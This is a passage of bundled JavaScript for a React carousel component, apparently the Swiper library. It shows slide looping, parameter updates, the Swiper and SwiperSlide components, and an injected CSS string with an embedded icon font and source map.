    swiper.params.navigation.prevEl = prevEl;
    swiper.originalParams.navigation.prevEl = prevEl;
  }

  if (needsPagination(swiperParams) && paginationEl) {
    swiper.params.pagination.el = paginationEl;
    swiper.originalParams.pagination.el = paginationEl;
  }

  if (needsScrollbar(swiperParams) && scrollbarEl) {
    swiper.params.scrollbar.el = scrollbarEl;
    swiper.originalParams.scrollbar.el = scrollbarEl;
  }

  swiper.init(el);
}

const calcLoopedSlides = (slides, swiperParams) => {
  let slidesPerViewParams = swiperParams.slidesPerView;

  if (swiperParams.breakpoints) {
    const breakpoint = Swiper$1.prototype.getBreakpoint(swiperParams.breakpoints);
    const breakpointOnlyParams = breakpoint in swiperParams.breakpoints ? swiperParams.breakpoints[breakpoint] : undefined;

    if (breakpointOnlyParams && breakpointOnlyParams.slidesPerView) {
      slidesPerViewParams = breakpointOnlyParams.slidesPerView;
    }
  }

  let loopedSlides = Math.ceil(parseFloat(swiperParams.loopedSlides || slidesPerViewParams, 10));
  loopedSlides += swiperParams.loopAdditionalSlides;

  if (loopedSlides > slides.length && swiperParams.loopedSlidesLimit) {
    loopedSlides = slides.length;
  }

  return loopedSlides;
};

function renderLoop(swiper, slides, swiperParams) {
  const modifiedSlides = slides.map((child, index) => {
    return /*#__PURE__*/React__default.cloneElement(child, {
      swiper,
      'data-swiper-slide-index': index
    });
  });

  function duplicateSlide(child, index, position) {
    return /*#__PURE__*/React__default.cloneElement(child, {
      key: `${child.key}-duplicate-${index}-${position}`,
      className: `${child.props.className || ''} ${swiperParams.slideDuplicateClass}`
    });
  }

  if (swiperParams.loopFillGroupWithBlank) {
    const blankSlidesNum = swiperParams.slidesPerGroup - modifiedSlides.length % swiperParams.slidesPerGroup;

    if (blankSlidesNum !== swiperParams.slidesPerGroup) {
      for (let i = 0; i < blankSlidesNum; i += 1) {
        const blankSlide = /*#__PURE__*/React__default.createElement("div", {
          className: `${swiperParams.slideClass} ${swiperParams.slideBlankClass}`
        });
        modifiedSlides.push(blankSlide);
      }
    }
  }

  if (swiperParams.slidesPerView === 'auto' && !swiperParams.loopedSlides) {
    swiperParams.loopedSlides = modifiedSlides.length;
  }

  const loopedSlides = calcLoopedSlides(modifiedSlides, swiperParams);
  const prependSlides = [];
  const appendSlides = [];

  for (let i = 0; i < loopedSlides; i += 1) {
    const index = i - Math.floor(i / modifiedSlides.length) * modifiedSlides.length;
    appendSlides.push(duplicateSlide(modifiedSlides[index], i, 'append'));
    prependSlides.unshift(duplicateSlide(modifiedSlides[modifiedSlides.length - index - 1], i, 'prepend'));
  }

  if (swiper) {
    swiper.loopedSlides = loopedSlides;
  }

  return [...prependSlides, ...modifiedSlides, ...appendSlides];
}

function getChangedParams(swiperParams, oldParams, children, oldChildren, getKey) {
  const keys = [];
  if (!oldParams) return keys;

  const addKey = key => {
    if (keys.indexOf(key) < 0) keys.push(key);
  };

  if (children && oldChildren) {
    const oldChildrenKeys = oldChildren.map(getKey);
    const childrenKeys = children.map(getKey);
    if (oldChildrenKeys.join('') !== childrenKeys.join('')) addKey('children');
    if (oldChildren.length !== children.length) addKey('children');
  }

  const watchParams = paramsList.filter(key => key[0] === '_').map(key => key.replace(/_/, ''));
  watchParams.forEach(key => {
    if (key in swiperParams && key in oldParams) {
      if (isObject(swiperParams[key]) && isObject(oldParams[key])) {
        const newKeys = Object.keys(swiperParams[key]);
        const oldKeys = Object.keys(oldParams[key]);

        if (newKeys.length !== oldKeys.length) {
          addKey(key);
        } else {
          newKeys.forEach(newKey => {
            if (swiperParams[key][newKey] !== oldParams[key][newKey]) {
              addKey(key);
            }
          });
          oldKeys.forEach(oldKey => {
            if (swiperParams[key][oldKey] !== oldParams[key][oldKey]) addKey(key);
          });
        }
      } else if (swiperParams[key] !== oldParams[key]) {
        addKey(key);
      }
    }
  });
  return keys;
}

function isChildSwiperSlide(child) {
  return child.type && child.type.displayName && child.type.displayName.includes('SwiperSlide');
}

function processChildren(c) {
  const slides = [];
  React__default.Children.toArray(c).forEach(child => {
    if (isChildSwiperSlide(child)) {
      slides.push(child);
    } else if (child.props && child.props.children) {
      processChildren(child.props.children).forEach(slide => slides.push(slide));
    }
  });
  return slides;
}

function getChildren(c) {
  const slides = [];
  const slots = {
    'container-start': [],
    'container-end': [],
    'wrapper-start': [],
    'wrapper-end': []
  };
  React__default.Children.toArray(c).forEach(child => {
    if (isChildSwiperSlide(child)) {
      slides.push(child);
    } else if (child.props && child.props.slot && slots[child.props.slot]) {
      slots[child.props.slot].push(child);
    } else if (child.props && child.props.children) {
      const foundSlides = processChildren(child.props.children);

      if (foundSlides.length > 0) {
        foundSlides.forEach(slide => slides.push(slide));
      } else {
        slots['container-end'].push(child);
      }
    } else {
      slots['container-end'].push(child);
    }
  });
  return {
    slides,
    slots
  };
}

function updateSwiper({
  swiper,
  slides,
  passedParams,
  changedParams,
  nextEl,
  prevEl,
  scrollbarEl,
  paginationEl
}) {
  const updateParams = changedParams.filter(key => key !== 'children' && key !== 'direction');
  const {
    params: currentParams,
    pagination,
    navigation,
    scrollbar,
    virtual,
    thumbs
  } = swiper;
  let needThumbsInit;
  let needControllerInit;
  let needPaginationInit;
  let needScrollbarInit;
  let needNavigationInit;

  if (changedParams.includes('thumbs') && passedParams.thumbs && passedParams.thumbs.swiper && currentParams.thumbs && !currentParams.thumbs.swiper) {
    needThumbsInit = true;
  }

  if (changedParams.includes('controller') && passedParams.controller && passedParams.controller.control && currentParams.controller && !currentParams.controller.control) {
    needControllerInit = true;
  }

  if (changedParams.includes('pagination') && passedParams.pagination && (passedParams.pagination.el || paginationEl) && (currentParams.pagination || currentParams.pagination === false) && pagination && !pagination.el) {
    needPaginationInit = true;
  }

  if (changedParams.includes('scrollbar') && passedParams.scrollbar && (passedParams.scrollbar.el || scrollbarEl) && (currentParams.scrollbar || currentParams.scrollbar === false) && scrollbar && !scrollbar.el) {
    needScrollbarInit = true;
  }

  if (changedParams.includes('navigation') && passedParams.navigation && (passedParams.navigation.prevEl || prevEl) && (passedParams.navigation.nextEl || nextEl) && (currentParams.navigation || currentParams.navigation === false) && navigation && !navigation.prevEl && !navigation.nextEl) {
    needNavigationInit = true;
  }

  const destroyModule = mod => {
    if (!swiper[mod]) return;
    swiper[mod].destroy();

    if (mod === 'navigation') {
      currentParams[mod].prevEl = undefined;
      currentParams[mod].nextEl = undefined;
      swiper[mod].prevEl = undefined;
      swiper[mod].nextEl = undefined;
    } else {
      currentParams[mod].el = undefined;
      swiper[mod].el = undefined;
    }
  };

  updateParams.forEach(key => {
    if (isObject(currentParams[key]) && isObject(passedParams[key])) {
      extend(currentParams[key], passedParams[key]);
    } else {
      const newValue = passedParams[key];

      if ((newValue === true || newValue === false) && (key === 'navigation' || key === 'pagination' || key === 'scrollbar')) {
        if (newValue === false) {
          destroyModule(key);
        }
      } else {
        currentParams[key] = passedParams[key];
      }
    }
  });

  if (updateParams.includes('controller') && !needControllerInit && swiper.controller && swiper.controller.control && currentParams.controller && currentParams.controller.control) {
    swiper.controller.control = currentParams.controller.control;
  }

  if (changedParams.includes('children') && slides && virtual && currentParams.virtual.enabled) {
    virtual.slides = slides;
    virtual.update(true);
  } else if (changedParams.includes('children') && swiper.lazy && swiper.params.lazy.enabled) {
    swiper.lazy.load();
  }

  if (needThumbsInit) {
    const initialized = thumbs.init();
    if (initialized) thumbs.update(true);
  }

  if (needControllerInit) {
    swiper.controller.control = currentParams.controller.control;
  }

  if (needPaginationInit) {
    if (paginationEl) currentParams.pagination.el = paginationEl;
    pagination.init();
    pagination.render();
    pagination.update();
  }

  if (needScrollbarInit) {
    if (scrollbarEl) currentParams.scrollbar.el = scrollbarEl;
    scrollbar.init();
    scrollbar.updateSize();
    scrollbar.setTranslate();
  }

  if (needNavigationInit) {
    if (nextEl) currentParams.navigation.nextEl = nextEl;
    if (prevEl) currentParams.navigation.prevEl = prevEl;
    navigation.init();
    navigation.update();
  }

  if (changedParams.includes('allowSlideNext')) {
    swiper.allowSlideNext = passedParams.allowSlideNext;
  }

  if (changedParams.includes('allowSlidePrev')) {
    swiper.allowSlidePrev = passedParams.allowSlidePrev;
  }

  if (changedParams.includes('direction')) {
    swiper.changeDirection(passedParams.direction, false);
  }

  swiper.update();
}

function renderVirtual(swiper, slides, virtualData) {
  if (!virtualData) return null;
  const style = swiper.isHorizontal() ? {
    [swiper.rtlTranslate ? 'right' : 'left']: `${virtualData.offset}px`
  } : {
    top: `${virtualData.offset}px`
  };
  return slides.filter((child, index) => index >= virtualData.from && index <= virtualData.to).map(child => {
    return /*#__PURE__*/React__default.cloneElement(child, {
      swiper,
      style
    });
  });
}

const updateOnVirtualData = swiper => {
  if (!swiper || swiper.destroyed || !swiper.params.virtual || swiper.params.virtual && !swiper.params.virtual.enabled) return;
  swiper.updateSlides();
  swiper.updateProgress();
  swiper.updateSlidesClasses();

  if (swiper.lazy && swiper.params.lazy.enabled) {
    swiper.lazy.load();
  }

  if (swiper.parallax && swiper.params.parallax && swiper.params.parallax.enabled) {
    swiper.parallax.setTranslate();
  }
};

function useIsomorphicLayoutEffect(callback, deps) {
  // eslint-disable-next-line
  if (typeof window === 'undefined') return useEffect(callback, deps);
  return useLayoutEffect(callback, deps);
}

const SwiperSlideContext = /*#__PURE__*/createContext(null);
const SwiperContext = /*#__PURE__*/createContext(null);

function _extends$1() { _extends$1 = Object.assign ? Object.assign.bind() : function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends$1.apply(this, arguments); }
const Swiper = /*#__PURE__*/forwardRef(function (_temp, externalElRef) {
  let {
    className,
    tag: Tag = 'div',
    wrapperTag: WrapperTag = 'div',
    children,
    onSwiper,
    ...rest
  } = _temp === void 0 ? {} : _temp;
  let eventsAssigned = false;
  const [containerClasses, setContainerClasses] = useState('swiper');
  const [virtualData, setVirtualData] = useState(null);
  const [breakpointChanged, setBreakpointChanged] = useState(false);
  const initializedRef = useRef(false);
  const swiperElRef = useRef(null);
  const swiperRef = useRef(null);
  const oldPassedParamsRef = useRef(null);
  const oldSlides = useRef(null);
  const nextElRef = useRef(null);
  const prevElRef = useRef(null);
  const paginationElRef = useRef(null);
  const scrollbarElRef = useRef(null);
  const {
    params: swiperParams,
    passedParams,
    rest: restProps,
    events
  } = getParams(rest);
  const {
    slides,
    slots
  } = getChildren(children);

  const onBeforeBreakpoint = () => {
    setBreakpointChanged(!breakpointChanged);
  };

  Object.assign(swiperParams.on, {
    _containerClasses(swiper, classes) {
      setContainerClasses(classes);
    }

  });

  const initSwiper = () => {
    // init swiper
    Object.assign(swiperParams.on, events);
    eventsAssigned = true;
    swiperRef.current = new Swiper$1(swiperParams);

    swiperRef.current.loopCreate = () => {};

    swiperRef.current.loopDestroy = () => {};

    if (swiperParams.loop) {
      swiperRef.current.loopedSlides = calcLoopedSlides(slides, swiperParams);
    }

    if (swiperRef.current.virtual && swiperRef.current.params.virtual.enabled) {
      swiperRef.current.virtual.slides = slides;
      const extendWith = {
        cache: false,
        slides,
        renderExternal: setVirtualData,
        renderExternalUpdate: false
      };
      extend(swiperRef.current.params.virtual, extendWith);
      extend(swiperRef.current.originalParams.virtual, extendWith);
    }
  };

  if (!swiperElRef.current) {
    initSwiper();
  } // Listen for breakpoints change


  if (swiperRef.current) {
    swiperRef.current.on('_beforeBreakpoint', onBeforeBreakpoint);
  }

  const attachEvents = () => {
    if (eventsAssigned || !events || !swiperRef.current) return;
    Object.keys(events).forEach(eventName => {
      swiperRef.current.on(eventName, events[eventName]);
    });
  };

  const detachEvents = () => {
    if (!events || !swiperRef.current) return;
    Object.keys(events).forEach(eventName => {
      swiperRef.current.off(eventName, events[eventName]);
    });
  };

  useEffect(() => {
    return () => {
      if (swiperRef.current) swiperRef.current.off('_beforeBreakpoint', onBeforeBreakpoint);
    };
  }); // set initialized flag

  useEffect(() => {
    if (!initializedRef.current && swiperRef.current) {
      swiperRef.current.emitSlidesClasses();
      initializedRef.current = true;
    }
  }); // mount swiper

  useIsomorphicLayoutEffect(() => {
    if (externalElRef) {
      externalElRef.current = swiperElRef.current;
    }

    if (!swiperElRef.current) return;

    if (swiperRef.current.destroyed) {
      initSwiper();
    }

    mountSwiper({
      el: swiperElRef.current,
      nextEl: nextElRef.current,
      prevEl: prevElRef.current,
      paginationEl: paginationElRef.current,
      scrollbarEl: scrollbarElRef.current,
      swiper: swiperRef.current
    }, swiperParams);
    if (onSwiper) onSwiper(swiperRef.current); // eslint-disable-next-line

    return () => {
      if (swiperRef.current && !swiperRef.current.destroyed) {
        swiperRef.current.destroy(true, false);
      }
    };
  }, []); // watch for params change

  useIsomorphicLayoutEffect(() => {
    attachEvents();
    const changedParams = getChangedParams(passedParams, oldPassedParamsRef.current, slides, oldSlides.current, c => c.key);
    oldPassedParamsRef.current = passedParams;
    oldSlides.current = slides;

    if (changedParams.length && swiperRef.current && !swiperRef.current.destroyed) {
      updateSwiper({
        swiper: swiperRef.current,
        slides,
        passedParams,
        changedParams,
        nextEl: nextElRef.current,
        prevEl: prevElRef.current,
        scrollbarEl: scrollbarElRef.current,
        paginationEl: paginationElRef.current
      });
    }

    return () => {
      detachEvents();
    };
  }); // update on virtual update

  useIsomorphicLayoutEffect(() => {
    updateOnVirtualData(swiperRef.current);
  }, [virtualData]); // bypass swiper instance to slides

  function renderSlides() {
    if (swiperParams.virtual) {
      return renderVirtual(swiperRef.current, slides, virtualData);
    }

    if (!swiperParams.loop || swiperRef.current && swiperRef.current.destroyed) {
      return slides.map(child => {
        return /*#__PURE__*/React__default.cloneElement(child, {
          swiper: swiperRef.current
        });
      });
    }

    return renderLoop(swiperRef.current, slides, swiperParams);
  }

  return /*#__PURE__*/React__default.createElement(Tag, _extends$1({
    ref: swiperElRef,
    className: uniqueClasses(`${containerClasses}${className ? ` ${className}` : ''}`)
  }, restProps), /*#__PURE__*/React__default.createElement(SwiperContext.Provider, {
    value: swiperRef.current
  }, slots['container-start'], /*#__PURE__*/React__default.createElement(WrapperTag, {
    className: "swiper-wrapper"
  }, slots['wrapper-start'], renderSlides(), slots['wrapper-end']), needsNavigation(swiperParams) && /*#__PURE__*/React__default.createElement(React__default.Fragment, null, /*#__PURE__*/React__default.createElement("div", {
    ref: prevElRef,
    className: "swiper-button-prev"
  }), /*#__PURE__*/React__default.createElement("div", {
    ref: nextElRef,
    className: "swiper-button-next"
  })), needsScrollbar(swiperParams) && /*#__PURE__*/React__default.createElement("div", {
    ref: scrollbarElRef,
    className: "swiper-scrollbar"
  }), needsPagination(swiperParams) && /*#__PURE__*/React__default.createElement("div", {
    ref: paginationElRef,
    className: "swiper-pagination"
  }), slots['container-end']));
});
Swiper.displayName = 'Swiper';

function _extends() { _extends = Object.assign ? Object.assign.bind() : function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }
const SwiperSlide = /*#__PURE__*/forwardRef(function (_temp, externalRef) {
  let {
    tag: Tag = 'div',
    children,
    className = '',
    swiper,
    zoom,
    virtualIndex,
    ...rest
  } = _temp === void 0 ? {} : _temp;
  const slideElRef = useRef(null);
  const [slideClasses, setSlideClasses] = useState('swiper-slide');

  function updateClasses(_s, el, classNames) {
    if (el === slideElRef.current) {
      setSlideClasses(classNames);
    }
  }

  useIsomorphicLayoutEffect(() => {
    if (externalRef) {
      externalRef.current = slideElRef.current;
    }

    if (!slideElRef.current || !swiper) {
      return;
    }

    if (swiper.destroyed) {
      if (slideClasses !== 'swiper-slide') {
        setSlideClasses('swiper-slide');
      }

      return;
    }

    swiper.on('_slideClass', updateClasses); // eslint-disable-next-line

    return () => {
      if (!swiper) return;
      swiper.off('_slideClass', updateClasses);
    };
  });
  useIsomorphicLayoutEffect(() => {
    if (swiper && slideElRef.current && !swiper.destroyed) {
      setSlideClasses(swiper.getSlideClasses(slideElRef.current));
    }
  }, [swiper]);
  const slideData = {
    isActive: slideClasses.indexOf('swiper-slide-active') >= 0 || slideClasses.indexOf('swiper-slide-duplicate-active') >= 0,
    isVisible: slideClasses.indexOf('swiper-slide-visible') >= 0,
    isDuplicate: slideClasses.indexOf('swiper-slide-duplicate') >= 0,
    isPrev: slideClasses.indexOf('swiper-slide-prev') >= 0 || slideClasses.indexOf('swiper-slide-duplicate-prev') >= 0,
    isNext: slideClasses.indexOf('swiper-slide-next') >= 0 || slideClasses.indexOf('swiper-slide-duplicate-next') >= 0
  };

  const renderChildren = () => {
    return typeof children === 'function' ? children(slideData) : children;
  };

  return /*#__PURE__*/React__default.createElement(Tag, _extends({
    ref: slideElRef,
    className: uniqueClasses(`${slideClasses}${className ? ` ${className}` : ''}`),
    "data-swiper-slide-index": virtualIndex
  }, rest), /*#__PURE__*/React__default.createElement(SwiperSlideContext.Provider, {
    value: slideData
  }, zoom ? /*#__PURE__*/React__default.createElement("div", {
    className: "swiper-zoom-container",
    "data-swiper-zoom": typeof zoom === 'number' ? zoom : undefined
  }, renderChildren()) : renderChildren()));
});
SwiperSlide.displayName = 'SwiperSlide';

function styleInject(css, ref) {
  if ( ref === void 0 ) ref = {};
  var insertAt = ref.insertAt;

  if (!css || typeof document === 'undefined') { return; }

  var head = document.head || document.getElementsByTagName('head')[0];
  var style = document.createElement('style');
  style.type = 'text/css';

  if (insertAt === 'top') {
    if (head.firstChild) {
      head.insertBefore(style, head.firstChild);
    } else {
      head.appendChild(style);
    }
  } else {
    head.appendChild(style);
  }

  if (style.styleSheet) {
    style.styleSheet.cssText = css;
  } else {
    style.appendChild(document.createTextNode(css));
  }
}

var css_248z$2 = "@font-face{font-family:swiper-icons;font-style:normal;font-weight:400;src:url(\"data:application/font-woff;charset=utf-8;base64, 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\")}:root{--swiper-theme-color:#007aff}.swiper-min_swiper__V84x4{list-style:none;margin-left:auto;margin-right:auto;overflow:hidden;padding:0;position:relative;z-index:1}.swiper-min_swiper-vertical__f-bRW>.swiper-min_swiper-wrapper__W4YLr{flex-direction:column}.swiper-min_swiper-wrapper__W4YLr{box-sizing:content-box;display:flex;height:100%;position:relative;transition-property:transform;width:100%;z-index:1}.swiper-min_swiper-android__qNses .swiper-min_swiper-slide__9M7Jz,.swiper-min_swiper-wrapper__W4YLr{transform:translateZ(0)}.swiper-min_swiper-pointer-events__ZvQtf{touch-action:pan-y}.swiper-min_swiper-pointer-events__ZvQtf.swiper-min_swiper-vertical__f-bRW{touch-action:pan-x}.swiper-min_swiper-slide__9M7Jz{flex-shrink:0;height:100%;position:relative;transition-property:transform;width:100%}.swiper-min_swiper-slide-invisible-blank__T1QR3{visibility:hidden}.swiper-min_swiper-autoheight__zSZSl,.swiper-min_swiper-autoheight__zSZSl .swiper-min_swiper-slide__9M7Jz{height:auto}.swiper-min_swiper-autoheight__zSZSl .swiper-min_swiper-wrapper__W4YLr{align-items:flex-start;transition-property:transform,height}.swiper-min_swiper-backface-hidden__1GR8h .swiper-min_swiper-slide__9M7Jz{-webkit-backface-visibility:hidden;backface-visibility:hidden;transform:translateZ(0)}.swiper-min_swiper-3d__-rKHI,.swiper-min_swiper-3d__-rKHI.swiper-min_swiper-css-mode__60NoR .swiper-min_swiper-wrapper__W4YLr{perspective:1200px}.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-cube-shadow__hrGcX,.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow-bottom__TfG7q,.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow-left__V50Za,.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow-right__FfSB1,.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow-top__29JQx,.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow__0p3or,.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide__9M7Jz,.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-wrapper__W4YLr{transform-style:preserve-3d}.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow-bottom__TfG7q,.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow-left__V50Za,.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow-right__FfSB1,.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow-top__29JQx,.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow__0p3or{height:100%;left:0;pointer-events:none;position:absolute;top:0;width:100%;z-index:10}.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow__0p3or{background:rgba(0,0,0,.15)}.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow-left__V50Za{background-image:linear-gradient(270deg,rgba(0,0,0,.5),transparent)}.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow-right__FfSB1{background-image:linear-gradient(90deg,rgba(0,0,0,.5),transparent)}.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow-top__29JQx{background-image:linear-gradient(0deg,rgba(0,0,0,.5),transparent)}.swiper-min_swiper-3d__-rKHI .swiper-min_swiper-slide-shadow-bottom__TfG7q{background-image:linear-gradient(180deg,rgba(0,0,0,.5),transparent)}.swiper-min_swiper-css-mode__60NoR>.swiper-min_swiper-wrapper__W4YLr{-ms-overflow-style:none;overflow:auto;scrollbar-width:none}.swiper-min_swiper-css-mode__60NoR>.swiper-min_swiper-wrapper__W4YLr::-webkit-scrollbar{display:none}.swiper-min_swiper-css-mode__60NoR>.swiper-min_swiper-wrapper__W4YLr>.swiper-min_swiper-slide__9M7Jz{scroll-snap-align:start start}.swiper-min_swiper-horizontal__3-DUS.swiper-min_swiper-css-mode__60NoR>.swiper-min_swiper-wrapper__W4YLr{scroll-snap-type:x mandatory}.swiper-min_swiper-vertical__f-bRW.swiper-min_swiper-css-mode__60NoR>.swiper-min_swiper-wrapper__W4YLr{scroll-snap-type:y mandatory}.swiper-min_swiper-centered__MUrR8>.swiper-min_swiper-wrapper__W4YLr:before{content:\"\";flex-shrink:0;order:9999}.swiper-min_swiper-centered__MUrR8.swiper-min_swiper-horizontal__3-DUS>.swiper-min_swiper-wrapper__W4YLr>.swiper-min_swiper-slide__9M7Jz:first-child{margin-inline-start:var(--swiper-centered-offset-before)}.swiper-min_swiper-centered__MUrR8.swiper-min_swiper-horizontal__3-DUS>.swiper-min_swiper-wrapper__W4YLr:before{height:100%;min-height:1px;width:var(--swiper-centered-offset-after)}.swiper-min_swiper-centered__MUrR8.swiper-min_swiper-vertical__f-bRW>.swiper-min_swiper-wrapper__W4YLr>.swiper-min_swiper-slide__9M7Jz:first-child{margin-block-start:var(--swiper-centered-offset-before)}.swiper-min_swiper-centered__MUrR8.swiper-min_swiper-vertical__f-bRW>.swiper-min_swiper-wrapper__W4YLr:before{height:var(--swiper-centered-offset-after);min-width:1px;width:100%}.swiper-min_swiper-centered__MUrR8>.swiper-min_swiper-wrapper__W4YLr>.swiper-min_swiper-slide__9M7Jz{scroll-snap-align:center center;scroll-snap-stop:always}\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInN3aXBlci5taW4uY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQVlBLFdBQVcsd0JBQXdCLENBQThzRSxpQkFBZ0IsQ0FBaEMsZUFBZSxDQUE1c0UsNHJFQUE4dEUsQ0FBQyxNQUFNLDRCQUE0QixDQUFDLDBCQUE2RSxlQUFlLENBQXBGLGdCQUFnQixDQUFDLGlCQUFpQixDQUFtQixlQUFlLENBQWlCLFNBQVMsQ0FBM0QsaUJBQWlCLENBQTJDLFNBQVMsQ0FBQyxxRUFBaUMscUJBQXFCLENBQUMsa0NBQThHLHNCQUFxQixDQUFoRSxZQUFZLENBQWxDLFdBQVcsQ0FBeEMsaUJBQWlCLENBQStDLDZCQUE2QixDQUEzRSxVQUFVLENBQWEsU0FBMkUsQ0FBQyxvR0FBOEMsdUJBQThCLENBQUMseUNBQXVCLGtCQUFrQixDQUFDLDJFQUF1QyxrQkFBa0IsQ0FBQyxnQ0FBYyxhQUFhLENBQVksV0FBVyxDQUFDLGlCQUFpQixDQUFDLDZCQUE0QixDQUFyRSxVQUFzRSxDQUFDLGdEQUE4QixpQkFBaUIsQ0FBQywwR0FBb0QsV0FBVyxDQUFDLHVFQUFtQyxzQkFBc0IsQ0FBQyxvQ0FBb0MsQ0FBQywwRUFBOEQsa0NBQWtDLENBQUMsMEJBQXlCLENBQXBGLHVCQUFxRixDQUFDLDhIQUFzRCxrQkFBa0IsQ0FBQyx5aUJBQXlRLDJCQUEyQixDQUFDLDBXQUFnTyxXQUFXLENBQW5DLE1BQU0sQ0FBOEIsbUJBQW1CLENBQXpFLGlCQUFpQixDQUFRLEtBQUssQ0FBQyxVQUFVLENBQWlDLFVBQVUsQ0FBQyxvRUFBZ0MsMEJBQTBCLENBQUMseUVBQXFDLG1FQUFzRSxDQUFDLDBFQUFzQyxrRUFBdUUsQ0FBQyx3RUFBb0MsaUVBQXFFLENBQUMsMkVBQXVDLG1FQUF3RSxDQUFDLHFFQUFvRSx1QkFBc0IsQ0FBekQsYUFBYSxDQUFDLG9CQUE0QyxDQUFDLHdGQUFvRCxZQUFZLENBQUMscUdBQStDLDZCQUE2QixDQUFDLHlHQUFtRCw0QkFBNEIsQ0FBQyx1R0FBaUQsNEJBQTRCLENBQUMsNEVBQXlDLFVBQVUsQ0FBQyxhQUFhLENBQUMsVUFBVSxDQUFDLHFKQUE2RSx3REFBd0QsQ0FBQyxnSEFBMkQsV0FBVyxDQUFDLG